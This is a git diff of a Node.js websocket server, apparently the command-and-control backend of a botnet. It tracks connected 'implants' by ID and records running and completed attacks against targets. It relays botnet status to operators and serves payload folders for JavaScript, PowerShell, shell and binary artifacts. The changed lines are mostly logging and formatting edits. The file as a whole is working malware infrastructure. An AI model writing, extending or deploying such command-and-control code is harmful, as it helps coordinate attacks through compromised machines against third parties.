@@ -67,15 +67,20 @@ const webSocketsServer = async (httpServer, attacks_running) => {
       }
 
 
-      console.log(`Agente conectado con ID: ${clientId}`);
-      agents.set(clientId, socket);
-      socket.isAlive = true;
 
+      console.log(`Agente conectado con ID: ${clientId}`);
+
+      
+      socket.isAlive = true;
+      agents.set(clientId, socket);
+      
       //------------------------Datos proveniente de implantes-------------------------
       socket.on('message', (data) => {
-          const data_parsed = JSON.parse(data);
+        const data_parsed = JSON.parse(data);
           
+        
           if(!data_parsed.error) {
+            console.log(data_parsed);
             
             if(data_parsed.status === 'attack_completed') {
               // Filtrar para REMOVER el ataque completado
@@ -85,6 +90,7 @@ const webSocketsServer = async (httpServer, attacks_running) => {
                       a.target !== data_parsed.target
                     ); 
                   } else if(data_parsed.status === 'attack_running') {
+                    
                     // Solo agregar si es un nuevo ataque
                   const exists = attacks_running.attacks.some(a => 
                       a.attack_type === data_parsed.attack_type && 
@@ -110,10 +116,19 @@ const webSocketsServer = async (httpServer, attacks_running) => {
     // Intervalo para verificar estado de los agents y notificar users
     const interval = setInterval(async () => {
       const db_clients = await Implant.find(); // Asumo que `clients` es una colección de DB
+
+      
       const client_db_list = db_clients.map(x => x);
       const status_connections = [];
 
+
+  /*     for (const key of agents.keys()) {
+        console.log("socket:",key);
+      }
+       */
       client_db_list.forEach((c) => {
+        /* console.log("db:",c.impl_id); */
+        
         const ws = agents.get(c.impl_id);
         if (ws) {
           if (ws.isAlive) {
@@ -126,14 +141,14 @@ const webSocketsServer = async (httpServer, attacks_running) => {
         }
       });
 
-
-
+      
+      
       // Enviar estados a todos los users conectados
       const payload = {
         data: status_connections,
         botnet: attacks_running.attacks
       };
-
+      
       
     // Reenviar a todos los users
     users.forEach(userSocket => {
@@ -172,7 +187,8 @@ const main = async () =>{
     app.use(express.json())
     app.use(express.urlencoded({ extended: true })); // Para formularios HTML
 
-    app.use('/api/arts/js', express.static(path.join(__dirname, 'public/arts/js/') ));
+    ;
+    app.use('/api/arts/js',express.static(path.join(__dirname, 'public/arts/js/') ));
     app.use('/api/arts/power', express.static(path.join(__dirname, 'public/arts/power/') ));
     app.use('/api/arts/sh', express.static(path.join(__dirname, 'public/arts/sh/') ));
     app.use('/api/arts/bin', express.static(path.join(__dirname, 'public/arts/bin/') ));
@@ -189,7 +205,7 @@ const main = async () =>{
     app.use(type_errors);
     app.use(syntax_errors);
     
-    server.listen(process.env.PORT, 'localhost', ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))
+    server.listen(process.env.PORT, '127.0.0.1', ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))
 
 }
 main()
